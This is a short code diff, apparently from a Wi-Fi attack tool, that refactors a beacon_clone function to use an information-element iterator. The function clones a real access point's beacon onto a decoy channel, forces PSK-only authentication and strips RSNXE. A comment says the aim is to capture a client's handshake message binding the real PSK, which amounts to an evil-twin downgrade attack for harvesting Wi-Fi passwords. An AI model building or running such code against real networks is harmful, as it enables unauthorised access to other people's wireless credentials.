@@ -7,7 +7,10 @@ our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
 import struct
 from typing import Optional
 
-from wifit3.dot11.ie import rates_ie, ext_rates_ie, ds_param_ie, force_psk_akm, GENERIC_RSN_IE
+from wifit3.dot11.ie import (
+    GENERIC_RSN_IE, ds_param_ie, ext_rates_ie, force_psk_akm,
+    iter_information_elements, rates_ie,
+)
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
 
 _CAP_ESS_PRIVACY = 0x0011
@@ -71,22 +74,15 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
         head[16:22] = bssid          # Addr3 (BSSID)
     tags = real_beacon[_BEACON_HEAD:]
     kept = bytearray()
-    ptr = 0
-    while ptr + 2 <= len(tags):
-        end = ptr + 2 + tags[ptr + 1]
-        if end > len(tags):
-            break
-        elem = tags[ptr:end]
-        tag_id = tags[ptr]
+    for tag_id, _body, elem in iter_information_elements(tags):
         if tag_id == _ELEMID_RSN:
-            kept += force_psk_akm(bytes(elem)) or GENERIC_RSN_IE
+            kept += force_psk_akm(elem) or GENERIC_RSN_IE
         elif tag_id == _ELEMID_DS:
             kept += ds_param_ie(decoy_channel)
         elif tag_id == _ELEMID_HT_OP:
-            kept += _ht_op_to_channel(bytes(elem), decoy_channel)
+            kept += _ht_op_to_channel(elem, decoy_channel)
         elif tag_id == _ELEMID_VHT_OP:
-            kept += _vht_op_to_20mhz(bytes(elem))
+            kept += _vht_op_to_20mhz(elem)
         elif tag_id != _ELEMID_RSNXE:
             kept += elem
-        ptr = end
     return bytes(head) + bytes(kept)
